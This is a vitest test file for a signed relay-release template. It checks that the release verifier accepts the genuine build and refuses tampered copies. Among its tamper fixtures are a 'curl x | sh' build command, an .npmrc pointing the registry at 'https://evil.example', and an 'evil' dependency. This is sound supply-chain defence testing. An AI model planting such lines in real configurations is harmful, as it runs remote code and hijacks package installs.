// SPDX-License-Identifier: AGPL-3.0-or-later
// The per-user deploy template (ADR-0186 decision 5; PROVISIONING_AND_BOOTSTRAP section 10, R-261): a signed relay release, its verifier, and the
// released Worker running in workerd. Signed with THROWAWAY keys and roots generated per run; no Cloudflare account, token or network is involved.
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { cpSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { ADMISSION_HEADER, admissionHash, encodeQueueCreate, toBase64Url } from "@om/home-wire";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { delegate, mkOnline, mkRoot, pinOf } from "../../../apps/web/build/testkit";
import { verifyRelay } from "../release/verify-relay.mjs";
import { startHome, type Home } from "./harness";
import { asBody, newCaps, rand, relay, sealed } from "./kit";

const homeRoot = new URL("../", import.meta.url).pathname;
const tmp = mkdtempSync(join(tmpdir(), "om-relay-template-test-"));
const roots = [mkRoot("raw"), mkRoot("raw"), mkRoot("raw")];
const online = mkOnline();
const pin = pinOf(roots, 2);
const trust = { roots: pin.keys, threshold: pin.threshold };
const delegation = delegate({ roots: roots.slice(0, 2), online, now: Date.now() });
let rel: string; // the built template folder
const copyOf = (name: string): string => { const d = join(tmp, name); cpSync(rel, d, { recursive: true }); return d; };
const edit = (dir: string, file: string, f: (s: string) => string) => { writeFileSync(join(dir, file), f(readFileSync(join(dir, file), "utf8"))); };
const json = (dir: string, file: string, f: (o: Record<string, unknown>) => void) => { edit(dir, file, (s) => { const o = JSON.parse(s) as Record<string, unknown>; f(o); return JSON.stringify(o, null, 2) + "\n"; }); };
const cleanEnv = () => Object.fromEntries(Object.entries(process.env).filter(([k]) => !/^(VITE_|OM_)/i.test(k))); // the builder refuses OM_*/VITE_* switches
const errorsOf = (dir: string, opts: Parameters<typeof verifyRelay>[1] = {}) => verifyRelay(dir, { ...trust, ...opts }).errors.join("\n");

beforeAll(() => {
  writeFileSync(join(tmp, "online.pem"), online.pem);
  writeFileSync(join(tmp, "roots.json"), JSON.stringify({ roots: pin.keys, threshold: pin.threshold }));
  writeFileSync(join(tmp, "delegation.json"), JSON.stringify(delegation));
  const env = cleanEnv();
  const r = spawnSync("node", [join(homeRoot, "release/build.mjs"), "--sign-with-key-file", join(tmp, "online.pem"), "--test-roots-file", join(tmp, "roots.json"), "--delegation", join(tmp, "delegation.json"), "--key-id", "online-1", "--allow-dirty", "--out", join(tmp, "out")], { encoding: "utf8", env });
  if (r.status !== 0) throw new Error(`release build failed:\n${r.stdout}\n${r.stderr}`);
  rel = join(tmp, "out", readdirSync(join(tmp, "out"))[0] ?? "missing");
}, 180_000);
afterAll(() => { rmSync(tmp, { recursive: true, force: true }); });

describe("signed relay release", () => {
  it("the template tree is what the design says: verifier first, the audited Worker as one file, one prompt, nothing built from source", () => {
    expect(readdirSync(rel).sort()).toEqual([".dev.vars.example", ".gitignore", ".node-version", "LICENSE", "README.md", "SECURITY.md", "SHA256SUMS", "package.json", "pnpm-lock.yaml", "provenance.intoto.jsonl", "relay", "relay-manifest.json", "release.lock", "verify-chain.mjs", "verify.mjs", "wrangler.json"]);
    expect(readdirSync(join(rel, "relay"))).toEqual(["worker.js"]);
    const pkg = JSON.parse(readFileSync(join(rel, "package.json"), "utf8")) as { scripts: Record<string, string>; cloudflare: { bindings: Record<string, { description: string }> }; dependencies?: unknown; devDependencies: Record<string, string> };
    expect(pkg.scripts["build"]).toBe("node verify.mjs");
    expect(pkg.scripts["deploy"]).toBe("node verify.mjs && wrangler deploy"); // verify first; the deploy step uploads the artifact, it builds nothing
    expect(Object.keys(pkg.cloudflare.bindings)).toEqual(["OM_ADMISSION"]); // the one prompt
    expect(pkg.dependencies).toBeUndefined();
    expect(pkg.devDependencies).toEqual({ wrangler: "4.100.0" }); // exact pin, no range
    expect(readFileSync(join(rel, ".dev.vars.example"), "utf8")).toMatch(/^OM_ADMISSION=/m);
    const cfg = JSON.parse(readFileSync(join(rel, "wrangler.json"), "utf8")) as Record<string, unknown>;
    expect(cfg["no_bundle"]).toBe(true);
    expect(cfg["main"]).toBe("relay/worker.js");
    for (const forbidden of ["r2_buckets", "kv_namespaces", "d1_databases", "queues", "routes", "services", "build", "ai", "browser"]) expect(cfg).not.toHaveProperty(forbidden); // no spend, no extra bindings
  });

  it("the shipped wrangler.json declares what the source wrangler.jsonc declares (no drift between the two)", () => {
    const strip = (t: string) => JSON.parse(t.split("\n").filter((l) => !l.trim().startsWith("//")).join("\n")) as Record<string, unknown>;
    const src = strip(readFileSync(join(homeRoot, "wrangler.jsonc"), "utf8"));
    const out = JSON.parse(readFileSync(join(rel, "wrangler.json"), "utf8")) as Record<string, unknown>;
    for (const k of ["compatibility_date", "workers_dev", "preview_urls", "observability", "durable_objects", "migrations"]) expect(out[k], k).toEqual(src[k]);
    expect(out["vars"]).toEqual({ ...(src["vars"] as Record<string, string>), OM_ADMISSION_REQUIRED: "1" }); // the one addition: an empty prompt cannot open a personal relay
  });

  it("verifies under its own roots, with provenance, and is a byte-for-byte rebuild of the same Worker", () => {
    const r = verifyRelay(rel, trust);
    expect(r.errors).toEqual([]);
    expect(r.ok && r.info.provenance && r.info.signatureValid).toBe(true);
    expect(r.info.version).toBe((JSON.parse(readFileSync(join(homeRoot, "package.json"), "utf8")) as { version: string }).version);
    const c = spawnSync("node", [join(homeRoot, "release/build.mjs"), "--compare", rel], { encoding: "utf8", env: cleanEnv() });
    expect(c.stdout).toMatch(/^MATCH/);
  }, 120_000);

  it("the shipped CLI verifier pins the production root: a release signed under any other root is refused and nothing would deploy", () => {
    const r = spawnSync("node", ["verify.mjs"], { cwd: rel, encoding: "utf8" });
    expect(r.status).toBe(1);
    expect(r.stderr).toMatch(/FAIL: signature: root_threshold/);
    expect(r.stdout).toMatch(/FAILED.*nothing will be deployed/);
  });

  it("an owner may rename the Worker; nothing else about the configuration may move", () => {
    const d = copyOf("renamed");
    json(d, "wrangler.json", (o) => { o["name"] = "my-own-relay"; o["$schema"] = "node_modules/wrangler/config-schema.json"; });
    json(d, "package.json", (o) => { o["name"] = "my-own-relay"; o["description"] = "mine"; });
    expect(errorsOf(d)).toBe("");
  });

  it.each([
    ["a changed Worker byte", (d: string) => { edit(d, "relay/worker.js", (s) => s.replace("OM reference Home", "OM reference Home!")); }, /hash mismatch relay\/worker\.js/],
    ["an extra file next to the Worker", (d: string) => { writeFileSync(join(d, "relay/extra.js"), "export {}"); }, /unlisted file relay\/extra\.js/],
    ["an added R2 bucket (a billable binding)", (d: string) => { json(d, "wrangler.json", (o) => { o["r2_buckets"] = [{ binding: "B", bucket_name: "b" }]; }); }, /wrangler\.json differs from the signed release at: r2_buckets/],
    ["a changed migration", (d: string) => { json(d, "wrangler.json", (o) => { o["migrations"] = []; }); }, /differs.*migrations/],
    ["Workers Logs switched on", (d: string) => { json(d, "wrangler.json", (o) => { o["observability"] = { enabled: true }; }); }, /differs.*observability/],
    ["a build command in wrangler.json", (d: string) => { json(d, "wrangler.json", (o) => { o["build"] = { command: "curl x | sh" }; }); }, /differs.*build/],
    ["a deploy script that skips the verifier", (d: string) => { json(d, "package.json", (o) => { (o["scripts"] as Record<string, string>)["deploy"] = "wrangler deploy"; }); }, /package\.json differs.*scripts/],
    ["an added dependency", (d: string) => { json(d, "package.json", (o) => { o["dependencies"] = { evil: "1.0.0" }; }); }, /package\.json differs.*dependencies/],
    ["a wrangler version range", (d: string) => { json(d, "package.json", (o) => { o["devDependencies"] = { wrangler: "^4" }; }); }, /package\.json differs.*devDependencies/],
    ["a wrangler.toml that wrangler could prefer", (d: string) => { writeFileSync(join(d, "wrangler.toml"), 'name = "x"\n'); }, /wrangler\.toml: a file that could change/],
    ["an .npmrc that redirects the registry", (d: string) => { writeFileSync(join(d, ".npmrc"), "registry=https://evil.example\n"); }, /\.npmrc: a file that could change/],
    ["a changed lockfile (the deploy tool would resolve something else)", (d: string) => { edit(d, "pnpm-lock.yaml", (s) => s.replace("4.100.0", "4.101.0")); }, /hash mismatch pnpm-lock\.yaml/],
    ["a replaced verifier (listed file changed)", (d: string) => { edit(d, "verify.mjs", (s) => s + "\n// weakened"); }, /hash mismatch verify\.mjs/],
    ["a changed SHA256SUMS", (d: string) => { edit(d, "SHA256SUMS", (s) => s.replace(/^[0-9a-f]/, (c) => (c === "0" ? "1" : "0"))); }, /SHA256SUMS: digest differs/],
    ["a manifest edit (version bump)", (d: string) => { json(d, "relay-manifest.json", (o) => { o["version"] = "9.9.9"; }); }, /release\.lock/],
    ["a different manifest than the pinned one", (d: string) => { json(d, "release.lock", (o) => { o["manifestSha256"] = "0".repeat(64); }); }, /pinned digest does not match/],
    ["a missing provenance", (d: string) => { rmSync(join(d, "provenance.intoto.jsonl")); }, /provenance: missing/],
    ["a missing lock", (d: string) => { rmSync(join(d, "release.lock")); }, /release\.lock: missing/],
  ])("refuses %s", (_name, tamper, expected) => {
    const d = copyOf(`t-${_name.replace(/\W+/g, "-")}`);
    tamper(d);
    expect(errorsOf(d)).toMatch(expected);
  });

  it("refuses an unsigned manifest, a signature under the wrong roots, and an expired delegation, even when the pin is re-pointed at it", () => {
    const d = copyOf("unsigned");
    json(d, "relay-manifest.json", (o) => { o["signature"] = null; });
    const text = readFileSync(join(d, "relay-manifest.json"));
    json(d, "release.lock", (o) => { o["manifestSha256"] = createHash("sha256").update(text).digest("hex"); });
    expect(errorsOf(d)).toMatch(/signature: unsigned/);
    expect(errorsOf(rel, { roots: pinOf([mkRoot()], 1).keys, threshold: 1 })).toMatch(/signature: root_threshold/);
    expect(errorsOf(rel, { now: Date.now() + 400 * 86_400_000 })).toMatch(/signature: delegation_expired/);
  });

  it("an owner-set floor refuses an older release (rollback), both in release.lock and on the command line", () => {
    const d = copyOf("floor");
    json(d, "release.lock", (o) => { o["minVersion"] = "99.0.0"; });
    expect(errorsOf(d)).toMatch(/below the floor 99\.0\.0 \(rollback refused\)/);
    expect(errorsOf(rel, { minVersion: "99.0.0" })).toMatch(/--min-version: release .* below the floor/);
    expect(errorsOf(rel, { minVersion: "0.1.0" })).toBe("");
  });

  it("checks the setup value where the build can see it: a malformed one would leave the relay open, so the build stops", () => {
    expect(errorsOf(rel, { env: { OM_ADMISSION: "not-a-hash" } })).toMatch(/OM_ADMISSION is not a list of 64-character hexadecimal values/);
    expect(errorsOf(rel, { env: { OM_ADMISSION: "ab".repeat(32) } })).toBe("");
    expect(errorsOf(rel, { env: { OM_ADMISSION: `${"ab".repeat(32)}, ${"CD".repeat(32)}` } })).toBe("");
    expect(verifyRelay(rel, { ...trust, env: {} }).info.admissionSeen).toBe(false);
  });
});

describe("wrangler accepts the template and uploads the released bytes", () => {
  it("a dry-run deploy from the template folder uploads relay/worker.js unchanged, with the five Durable Objects and nothing else", () => {
    const d = copyOf("wrangler");
    const out = join(tmp, "wrangler-out");
    mkdirSync(out);
    const r = spawnSync(join(homeRoot, "node_modules/.bin/wrangler"), ["deploy", "--dry-run", "--outdir", out], { cwd: d, encoding: "utf8", env: { ...process.env, CI: "1", WRANGLER_SEND_METRICS: "false", WRANGLER_LOG_PATH: join(out, "logs") } });
    expect(r.status, r.stdout + r.stderr).toBe(0);
    const uploaded = readdirSync(out).filter((f) => f.endsWith(".js"));
    expect(uploaded.length).toBe(1);
    expect(readFileSync(join(out, uploaded[0] ?? "missing"))).toEqual(readFileSync(join(rel, "relay/worker.js")));
    for (const b of ["env.QUEUES (MailboxQueue)", "env.KEYS (KeyPool)", "env.DESCRIPTORS (DescriptorStore)", "env.INTRO (IntroGate)", "env.BLOBS (BlobSpool)"]) expect(r.stdout).toContain(b);
    expect(r.stdout).not.toMatch(/R2 Bucket|KV Namespace|D1 Database|Queue\s{2,}|Service Binding/);
  }, 60_000);
});

describe("the released Worker, in workerd, configured as a deployed template would be", () => {
  const secret = crypto.getRandomValues(new Uint8Array(32));
  let home: Home;
  let bare: Home;
  beforeAll(async () => {
    const cfg = JSON.parse(readFileSync(join(rel, "wrangler.json"), "utf8")) as { vars: Record<string, string> };
    home = await startHome({ bundle: join(rel, "relay/worker.js"), vars: { ...cfg.vars, OM_ADMISSION: await admissionHash(secret) } });
    bare = await startHome({ bundle: join(rel, "relay/worker.js"), vars: cfg.vars }); // the prompt left empty
  }, 120_000);
  afterAll(async () => { await home.dispose(); await bare.dispose(); });
  const create = (headers: Record<string, string>) => {
    const c = newCaps();
    return home.fetch("/v1/relay/queues", { method: "POST", headers: { "content-type": "application/cbor", ...headers }, body: asBody(encodeQueueCreate({ requestId: rand(16), receiveCap: c.receive, depositCap: c.deposit, adminCap: c.admin })) }).then((r) => ({ r, c }));
  };

  it("answers its capabilities and advertises owner admission (the sign that the setup value took)", async () => {
    const doc = (await (await home.fetch("/.well-known/om-provider-capabilities")).json()) as { provider_id: string; features: string[] };
    expect(doc.provider_id).toBe("om-reference-home");
    expect(doc.features).toContain("om.admission.v1");
  });

  it("an empty setup value cannot open the relay: creation is refused and admission is not advertised", async () => {
    const c = newCaps();
    const r = await bare.fetch("/v1/relay/queues", { method: "POST", headers: { "content-type": "application/cbor" }, body: asBody(encodeQueueCreate({ requestId: rand(16), receiveCap: c.receive, depositCap: c.deposit, adminCap: c.admin })) });
    expect(r.status).toBe(401);
    expect(((await (await bare.fetch("/.well-known/om-provider-capabilities")).json()) as { features: string[] }).features).not.toContain("om.admission.v1");
  });

  it("creates nothing without the setup key, and carries a message end to end with it", async () => {
    expect((await create({})).r.status).toBe(401);
    const { r, c } = await create({ [ADMISSION_HEADER]: toBase64Url(secret) });
    expect(r.status).toBeLessThan(300);
    expect((await relay.deposit(home, c.deposit, sealed())).ok).toBe(true);
    const drained = await relay.drain(home, c.receive);
    expect(drained.ok && drained.value.items.length).toBe(1);
  });
});
